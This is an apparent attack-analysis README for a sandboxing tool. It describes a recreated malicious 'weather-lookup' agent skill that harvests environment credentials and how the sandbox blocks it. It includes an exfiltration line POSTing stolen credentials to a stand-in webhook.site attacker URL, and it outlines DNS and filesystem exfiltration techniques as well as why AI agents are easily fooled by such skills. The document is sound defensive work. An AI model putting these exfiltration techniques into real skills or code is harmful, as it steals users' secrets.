# Malicious Weather Skill — Attack Analysis

This directory contains a recreation of the **ClawdHub credential stealer** — a malicious skill discovered in the OpenClaw agent skill marketplace by user eudaemon_0.

## The Attack

A skill published as `weather-lookup` on ClawdHub performed weather lookups as advertised while silently stealing credentials from the host environment.

```
Agent installs "weather-lookup" from ClawdHub
    │
    ├─► Skill loads → reads ALL environment variables (AWS keys, tokens, passwords)
    ├─► Skill POSTs stolen credentials to https://webhook.site/attacker-uuid
    ├─► Skill fetches actual weather data (cover story)
    └─► Agent receives weather JSON, sees nothing wrong
```

## Why Agents Are Worse At Catching This Than Humans

A human developer might notice `requests.post("https://webhook.site/...")` in code review. But:

1. **Agents don't read source code of skills they install** — they trust the skill marketplace
2. **"Read env vars and make HTTP requests" is normal** for any integration skill
3. **The skill actually works** — it returns real weather data
4. **Agents are trained to be helpful and trusting** — the opposite of security-conscious

## Four Attack Vectors in This Demo

| # | Vector | Technique | Without Sandbox | With SkillSandbox |
|---|--------|-----------|-----------------|-------------------|
| 1 | Credential harvesting | `os.environ` reads all env vars | Gets AWS keys, tokens, DB passwords | Sees only 3 vars: `OPENWEATHER_API_KEY`, `LANG`, `PATH` |
| 2 | HTTPS exfiltration | POST to `webhook.site` | Data reaches attacker | **Connection refused** — iptables default-deny |
| 3 | DNS exfiltration | Encode data in subdomain queries | Queries reach attacker's nameserver | DNS queries fail to resolve |
| 4 | Filesystem stash | Write creds to hidden files | File written, attacker retrieves later | **Permission denied** — mount restrictions |

## Running the Demo

```bash
# Dry-run (no root needed) — shows what would be enforced
skillsandbox run --dry-run examples/skills/malicious-weather/

# Real enforcement (requires root for iptables)
sudo skillsandbox run examples/skills/malicious-weather/

# Compare with the legitimate skill
skillsandbox run --dry-run examples/skills/weather/
```

## What the Trace Shows

After running, check `trace.json`. Key events:

```
env_var_access:        "Environment filtered: 3 vars allowed, 47 vars stripped"
network_egress_allowed: "ALLOW api.openweathermap.org (104.26.12.44:443/tcp)"
network_egress_blocked: "DEFAULT DENY — all undeclared egress blocked"
stderr:                "[STEALER] HTTPS exfiltration BLOCKED"
stderr:                "[STEALER] Filesystem stash BLOCKED"
stderr:                "  Env vars visible to skill:  3"
stderr:                "  High-value creds found:     0"
```

**The attacker gets nothing.**

## The Community's Proposed Fix vs SkillSandbox

| Approach | How it works | Why it's insufficient |
|----------|-------------|----------------------|
| Code signing | Cryptographic signatures on skills | A signed skill can be compromised after publication |
| "Isnad chains" | Provenance verification (who reviewed the code) | Reviewers can miss obfuscated malicious code |
| Permission manifests (declared, not enforced) | Skill says what it needs | Nothing stops it from doing more |
| **SkillSandbox** | **Manifest is enforced at the kernel level** | **Undeclared access is blocked regardless of code** |

The principle: **Don't trust the code. Constrain what it can do.**

## Files

- `skillsandbox.yaml` — Manifest (identical permissions to the legit weather skill)
- `main.py` — Malicious skill code with 4 attack vectors
- `expected-trace.json` — What the trace output looks like under enforcement
- `ATTACK.md` — This file
